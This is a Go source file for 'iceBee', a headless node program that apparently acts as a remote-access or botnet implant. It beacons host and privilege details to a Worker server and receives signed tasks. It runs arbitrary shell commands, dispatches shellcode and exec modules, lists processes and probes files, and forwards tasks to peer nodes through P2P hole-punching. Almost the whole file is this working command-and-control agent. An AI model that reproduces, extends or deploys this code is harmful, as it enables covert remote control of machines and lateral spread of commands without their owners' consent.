// iceBee — 子节点（无头模式）
//
// 功能:
//   - 持续发送心跳包
//   - 接收 Admin 下发的指令 (task)
//   - 本地执行指令并收集输出
//   - 下一次心跳时将执行结果上报给 Worker
//
// 编译: go build -o node ./cmd/node
package main

import (
	"bytes"
	"context"
	"crypto/md5"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ── 配置 ──────────────────────────────────────────────────────────

var (
	workerURL   = "https://your-worker.workers.dev"
	hbInterval  = 5
	programName = "worker-agent"
	nodeID      = ""
	debug       = false
	debug2      = false
)

func logf(format string, args ...interface{}) {
	if debug || debug2 {
		fmt.Printf(format, args...)
	}
}

func logln(args ...interface{}) {
	if debug || debug2 {
		fmt.Println(args...)
	}
}

// logf2 仅在 debug2 模式下输出。
func logf2(format string, args ...interface{}) {
	if debug2 {
		fmt.Printf(format, args...)
	}
}

// ── 工具函数 ──────────────────────────────────────────────────────

// nodePerms 返回当前进程的权限信息。
func nodePerms() map[string]interface{} {
	info := map[string]interface{}{
		"uid":     os.Getuid(),
		"gid":     os.Getgid(),
		"is_root": os.Getuid() == 0,
	}
	if u, err := user.Current(); err == nil {
		info["username"] = u.Username
		info["home"]     = u.HomeDir
	}
	// 附加组
	if gids, err := os.Getgroups(); err == nil {
		names := make([]string, 0, len(gids))
		for _, gid := range gids {
			if g, err := user.LookupGroupId(strconv.Itoa(gid)); err == nil {
				names = append(names, g.Name)
			} else {
				names = append(names, strconv.Itoa(gid))
			}
		}
		info["groups"] = names
	}
	return info
}

func systemInfo() string {
	switch runtime.GOOS {
	case "windows":
		return "Windows"
	case "darwin":
		return "macOS-" + osRelease()
	default:
		return "Linux-" + osRelease()
	}
}

func osRelease() string {
	data, err := os.ReadFile("/etc/os-release")
	if err != nil {
		return runtime.GOARCH
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "PRETTY_NAME=") {
			return strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), `"`)
		}
	}
	return runtime.GOARCH
}

func nowISO() string {
	return time.Now().UTC().Format(time.RFC3339Nano)
}

func generateNodeID() string {
	hostname, _ := os.Hostname()
	seed := hostname + "-" + runtime.GOARCH + "-" + programName
	h := md5.Sum([]byte(seed))
	return fmt.Sprintf("node-%x", h[:4])
}

// ── 指令执行器 ────────────────────────────────────────────────────

type Executor struct {
	nodeID    string
	startTime time.Time
	mu        sync.Mutex
	executed  map[string]bool
	execLog   []execEntry
}

type execEntry struct {
	Command    string
	Status     string
	ExecutedAt string
}

func newExecutor(id string) *Executor {
	return &Executor{
		nodeID:    id,
		startTime: time.Now(),
		executed:  make(map[string]bool),
	}
}

func (e *Executor) shouldExecute(taskID string) bool {
	e.mu.Lock()
	defer e.mu.Unlock()
	if e.executed[taskID] {
		return false
	}
	e.executed[taskID] = true
	return true
}

func (e *Executor) run(task map[string]interface{}) map[string]interface{} {
	taskID, _ := task["taskId"].(string)
	command, _ := task["command"].(string)
	body, _ := task["body"].(map[string]interface{})
	if body == nil {
		body = map[string]interface{}{}
	}

	ts := time.Now().Format("15:04:05")
	logf("\n  ⚡ 执行任务 [%s]\n     Task ID:  %s\n     Command:  %s\n", ts, taskID, command)

	var output interface{}
	status := "completed"
	errStr := ""

	func() {
		defer func() {
			if r := recover(); r != nil {
				status = "error"
				errStr = fmt.Sprintf("%v", r)
			}
		}()
		switch command {
		case "collect_info":
			output = e.cmdCollectInfo()
		case "shell":
			output = e.cmdShell(body)
		case "ping":
			output = map[string]interface{}{
				"pong": true, "nodeId": e.nodeID,
				"timestamp":      nowISO(),
				"uptime_seconds": int(time.Since(e.startTime).Seconds()),
			}
		case "report_status":
			output = e.cmdReportStatus()
		case "download_check":
			output = e.cmdDownloadCheck(body)
		case "list_processes":
			output = e.cmdListProcesses(body)
		case "disk_usage":
			output = e.cmdDiskUsage(body)
		case "module.shellcode":
			output = cmdModuleShellcode(body)
		case "module.exec":
			output = cmdModuleExec(body)
		case "echo":
			output = map[string]interface{}{
				"echo": true, "received_body": body,
				"nodeId": e.nodeID, "timestamp": nowISO(),
			}
		default:
			output = map[string]interface{}{
				"info": "Unknown command: " + command, "received_body": body,
			}
			logln("     状态:     ⚠️  未知命令，已记录 body")
		}
	}()

	if errStr != "" {
		logf("     状态:     ❌ %s\n\n", errStr)
	} else {
		logf("     状态:     ✅ %s\n", status)
		if output != nil {
			b, _ := json.MarshalIndent(output, "     ", "  ")
			lines := strings.Split(string(b), "\n")
			shown := len(lines)
			if shown > 10 {
				shown = 10
			}
			for _, l := range lines[:shown] {
				logln("     " + l)
			}
			if len(lines) > 10 {
				logf("     ... (%d more lines)\n", len(lines)-10)
			}
		}
		logln()
	}

	e.mu.Lock()
	e.execLog = append(e.execLog, execEntry{command, status, nowISO()})
	if len(e.execLog) > 50 {
		e.execLog = e.execLog[1:]
	}
	e.mu.Unlock()

	return map[string]interface{}{
		"taskId":  taskID,
		"command": command,
		"status":  status,
		"output":  output,
		"error":   errStr,
	}
}

// ── 内置命令 ──────────────────────────────────────────────────────

func (e *Executor) cmdCollectInfo() map[string]interface{} {
	hostname, _ := os.Hostname()
	cwd, _ := os.Getwd()
	return map[string]interface{}{
		"hostname": hostname, "system": systemInfo(), "arch": runtime.GOARCH,
		"go_version": runtime.Version(), "cpu_count": runtime.NumCPU(),
		"pid": os.Getpid(), "cwd": cwd,
		"uptime_seconds": int(time.Since(e.startTime).Seconds()),
	}
}

func (e *Executor) cmdShell(body map[string]interface{}) map[string]interface{} {
	shellStr, _ := body["shell"].(string)
	if shellStr == "" {
		return map[string]interface{}{"error": "body.shell is empty"}
	}
	timeoutSec := 30
	if t, ok := body["timeout"].(float64); ok {
		timeoutSec = int(t)
	}
	logf("     执行 shell: %s\n", shellStr)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutSec)*time.Second)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/c", shellStr)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", shellStr)
	}
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	cmd.Run()

	if ctx.Err() == context.DeadlineExceeded {
		return map[string]interface{}{"command": shellStr, "error": fmt.Sprintf("Timeout (%ds)", timeoutSec)}
	}
	rc := 0
	if cmd.ProcessState != nil {
		rc = cmd.ProcessState.ExitCode()
	}
	outStr := stdout.String()
	errOut := stderr.String()
	if len(outStr) > 2000 {
		outStr = outStr[len(outStr)-2000:]
	}
	if len(errOut) > 1000 {
		errOut = errOut[len(errOut)-1000:]
	}
	return map[string]interface{}{
		"command": shellStr, "returncode": rc, "stdout": outStr, "stderr": errOut,
	}
}

func (e *Executor) cmdReportStatus() map[string]interface{} {
	e.mu.Lock()
	executed := len(e.executed)
	start := 0
	if len(e.execLog) > 5 {
		start = len(e.execLog) - 5
	}
	recent := make([]map[string]interface{}, 0)
	for _, l := range e.execLog[start:] {
		recent = append(recent, map[string]interface{}{
			"command": l.Command, "status": l.Status, "time": l.ExecutedAt,
		})
	}
	e.mu.Unlock()
	hostname, _ := os.Hostname()
	return map[string]interface{}{
		"nodeId": e.nodeID, "system": systemInfo(), "hostname": hostname,
		"uptime_seconds": int(time.Since(e.startTime).Seconds()),
		"tasks_executed": executed, "recent_tasks": recent,
		"go_version": runtime.Version(), "pid": os.Getpid(),
	}
}

func (e *Executor) cmdDownloadCheck(body map[string]interface{}) map[string]interface{} {
	path, _ := body["path"].(string)
	if path == "" {
		return map[string]interface{}{"error": "body.path is empty"}
	}
	info, err := os.Stat(path)
	result := map[string]interface{}{"path": path, "exists": err == nil}
	if err == nil {
		result["is_file"] = !info.IsDir()
		result["is_dir"] = info.IsDir()
		result["size_bytes"] = info.Size()
		result["modified"] = info.ModTime().Format(time.RFC3339)
	}
	return result
}

func (e *Executor) cmdListProcesses(body map[string]interface{}) map[string]interface{} {
	limit := 20
	if l, ok := body["limit"].(float64); ok {
		limit = int(l)
	}
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "darwin":
		cmd = exec.Command("sh", "-c", fmt.Sprintf("ps aux -m | head -%d", limit+1))
	case "windows":
		cmd = exec.Command("tasklist", "/FO", "CSV", "/NH")
	default:
		cmd = exec.Command("sh", "-c", fmt.Sprintf("ps aux --sort=-%mem | head -%d", limit+1))
	}
	out, err := cmd.Output()
	if err != nil {
		return map[string]interface{}{"error": err.Error()}
	}
	raw := string(out)
	if len(raw) > 3000 {
		raw = raw[:3000]
	}
	return map[string]interface{}{"raw_output": raw}
}

func (e *Executor) cmdDiskUsage(body map[string]interface{}) map[string]interface{} {
	path, _ := body["path"].(string)
	if path == "" {
		if runtime.GOOS == "windows" {
			path = "C:"
		} else {
			path = "/"
		}
	}
	if runtime.GOOS == "windows" {
		out, err := exec.Command("wmic", "logicaldisk", "where",
			"DeviceID='"+path+"'", "get", "Size,FreeSpace", "/format:value").Output()
		if err != nil {
			return map[string]interface{}{"path": path, "error": err.Error()}
		}
		return map[string]interface{}{"path": path, "raw_output": string(out)}
	}
	out, err := exec.Command("df", "-k", path).Output()
	if err != nil {
		return map[string]interface{}{"path": path, "error": err.Error()}
	}
	lines := strings.Split(strings.TrimSpace(string(out)), "\n")
	if len(lines) >= 2 {
		fields := strings.Fields(lines[1])
		if len(fields) >= 4 {
			total, _ := strconv.ParseInt(fields[1], 10, 64)
			used, _ := strconv.ParseInt(fields[2], 10, 64)
			free, _ := strconv.ParseInt(fields[3], 10, 64)
			toGB := func(kb int64) float64 {
				return float64(int(float64(kb)/1024/1024*100)) / 100
			}
			pct := 0.0
			if total > 0 {
				pct = float64(int(float64(used)/float64(total)*1000)) / 10
			}
			return map[string]interface{}{
				"path": path, "total_gb": toGB(total), "used_gb": toGB(used),
				"free_gb": toGB(free), "used_percent": pct,
			}
		}
	}
	return map[string]interface{}{"path": path, "raw_output": string(out)}
}

// ── 结果队列 ──────────────────────────────────────────────────────

type resultQueue struct {
	mu   sync.Mutex
	list []map[string]interface{}
}

func (q *resultQueue) push(r map[string]interface{}) {
	q.mu.Lock()
	defer q.mu.Unlock()
	q.list = append(q.list, r)
}

func (q *resultQueue) pop() (map[string]interface{}, bool) {
	q.mu.Lock()
	defer q.mu.Unlock()
	if len(q.list) == 0 {
		return nil, false
	}
	r := q.list[0]
	q.list = q.list[1:]
	return r, true
}

func (q *resultQueue) pushBack(r map[string]interface{}) {
	q.mu.Lock()
	defer q.mu.Unlock()
	q.list = append([]map[string]interface{}{r}, q.list...)
}

func (q *resultQueue) len() int {
	q.mu.Lock()
	defer q.mu.Unlock()
	return len(q.list)
}

// ── 心跳循环 ──────────────────────────────────────────────────────

func heartbeatLoop(id string, ex *Executor, rq *resultQueue) {
	client := &http.Client{Timeout: 10 * time.Second}
	totalSent := 0
	consecutiveFail := 0

	for {
		result, hasResult := rq.pop()

		// 每 60s（12次心跳）重新向 STUN 查询公网地址，已有连通 peer 时跳过
		if p2pN != nil && totalSent > 0 && totalSent%12 == 0 && !p2pN.HasConnectedPeer() {
			p2pN.RefreshPublicAddr(stunServer)
		}

		payload := map[string]interface{}{
			"system": systemInfo(), "timestamp": nowISO(),
			"program": programName, "nodeId": id,
			"perms": nodePerms(),
		}
		if hasResult {
			payload["taskResult"] = result
		}
		if p2pN != nil {
			payload["stunAddr"] = p2pN.publicAddr
			if rr := p2pN.PopRelayResults(); len(rr) > 0 {
				payload["relayResults"] = rr
				logf("  [p2p] 携带 %d 个中继结果上报\n", len(rr))
			}
		}

		b, _ := json.Marshal(payload)
		ts := time.Now().Format("15:04:05")

		if debug2 {
			pretty, _ := json.MarshalIndent(payload, "    ", "  ")
			logf2("  [%s] → 发送心跳 #%d\n    %s\n", ts, totalSent+1, pretty)
		}

		resp, err := client.Post(workerURL+"/heartbeat", "application/json", bytes.NewReader(b))
		totalSent++

		if err != nil {
			consecutiveFail++
			if hasResult {
				rq.pushBack(result)
			}
			logf("  [%s] ✗ 心跳失败 (连续 %d): %v\n", ts, consecutiveFail, err)
			backoff := consecutiveFail * 2
			if backoff > 30 {
				backoff = 30
			}
			if consecutiveFail > 1 {
				time.Sleep(time.Duration(backoff) * time.Second)
				continue
			}
		} else {
			consecutiveFail = 0
			var data map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&data)
			resp.Body.Close()

			if debug2 {
				pretty, _ := json.MarshalIndent(data, "    ", "  ")
				logf2("  [%s] ← 收到响应 #%d (HTTP %d)\n    %s\n", ts, totalSent, resp.StatusCode, pretty)
			}

			if ack, ok := data["resultAck"].(map[string]interface{}); ok {
				logf("  [%s] 📤 结果已确认: %s\n", ts, ack["taskId"])
			}

			// 缓存 Admin 公钥（Worker 从 KV 转发过来）
			if pubHex, ok := data["adminPubKey"].(string); ok && pubHex != "" {
				if err := SetAdminPubKey(pubHex); err != nil {
					logf("  [sign] 公钥更新失败: %v\n", err)
				}
			}

			if taskRaw, ok := data["task"].(map[string]interface{}); ok && taskRaw != nil {
				taskID, _ := taskRaw["taskId"].(string)
				// 验证签名，失败则拒绝执行
				if err := VerifyTask(taskRaw); err != nil {
					logf("  [sign] ⚠ 拒绝任务 %s: %v\n", taskID, err)
				} else if ex.shouldExecute(taskID) {
					go func(t map[string]interface{}) {
						res := ex.run(t)
						rq.push(res)
						logln("  📦 结果已入队，等待下次心跳上报")
					}(taskRaw)
					// 同时通过 P2P 转发给已连通的 peer
					if p2pN != nil {
						p2pN.ForwardTask(taskRaw)
					}
				}
			} else {
				line := fmt.Sprintf("  [%s] ✓ 心跳 #%d", ts, totalSent)
				if hasResult {
					line += " | 📤已上报"
				}
				if p := rq.len(); p > 0 {
					line += fmt.Sprintf(" | 待上报:%d", p)
				}
				if p2pN != nil {
					line += " | " + p2pN.StatusSummary()
				}
				logln(line)
			}

			// 解析 Worker 返回的 peer 地址列表，更新 P2P peer 表
			if p2pN != nil {
				if rawPeers, ok := data["peers"].([]interface{}); ok && len(rawPeers) > 0 {
					peers := make([]PeerAddrInfo, 0, len(rawPeers))
					for _, rp := range rawPeers {
						if m, ok := rp.(map[string]interface{}); ok {
							nid, _ := m["nodeId"].(string)
							addr, _ := m["addr"].(string)
							if nid != "" && addr != "" {
								peers = append(peers, PeerAddrInfo{NodeID: nid, Addr: addr})
							}
						}
					}
					if len(peers) > 0 {
						logf("  [p2p] Worker 返回 %d 个 peer 地址\n", len(peers))
						p2pN.UpdatePeers(peers)
					}
				}
			}
		}

		time.Sleep(time.Duration(hbInterval) * time.Second)
	}
}

// ── 入口 ──────────────────────────────────────────────────────────

func main() {
	flag.StringVar(&workerURL, "url", workerURL, "Worker URL")
	flag.StringVar(&nodeID, "id", "", "节点 ID")
	flag.StringVar(&programName, "program", programName, "程序名")
	flag.IntVar(&hbInterval, "interval", hbInterval, "心跳间隔(秒)")
	flag.BoolVar(&debug, "debug", false, "开启调试日志")
	flag.BoolVar(&debug2, "debug2", false, "开启详细心跳日志（含完整 JSON 收发）")
	flag.BoolVar(&p2pEnable, "p2p", p2pEnable, "启用 P2P 打洞 (实验性)")
	flag.IntVar(&p2pPort, "p2p-port", p2pPort, "P2P UDP 监听端口")
	flag.StringVar(&stunServer, "stun", stunServer, "STUN 服务器地址（留空使用内置列表）")
	flag.Parse()

	workerURL = strings.TrimRight(workerURL, "/")
	if nodeID == "" {
		nodeID = generateNodeID()
	}

	logf("节点 ID: %s | Worker: %s | 间隔: %ds | debug: %v\n", nodeID, workerURL, hbInterval, debug)

	if p2pEnable {
		var err error
		p2pN, err = newP2PNode(nodeID, p2pPort, stunServer)
		if err != nil {
			logf("[p2p] 初始化失败: %v\n", err)
			logf("[p2p] 将以无 P2P 模式继续运行\n")
		} else {
			logf("[p2p] 已启动 | 本地端口: %d | 公网地址: %s\n", p2pPort, p2pN.publicAddr)
			go p2pN.RunRecvLoop()
			go p2pN.RunPunchLoop()
			go p2pN.RunGossipLoop()
			go p2pN.RunHeartbeatLoop()
		}
	}

	rq := &resultQueue{}
	ex := newExecutor(nodeID)

	// 将本地执行器注册到 P2P 节点，使其能处理来自 peer 的转发命令
	if p2pN != nil {
		p2pN.execFn = ex.run
		p2pN.shouldExecuteFn = ex.shouldExecute // 同一去重 map，防止 Worker 重复下发
	}

	go heartbeatLoop(nodeID, ex, rq)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	<-sig
	logf("\n退出中…\n")
}
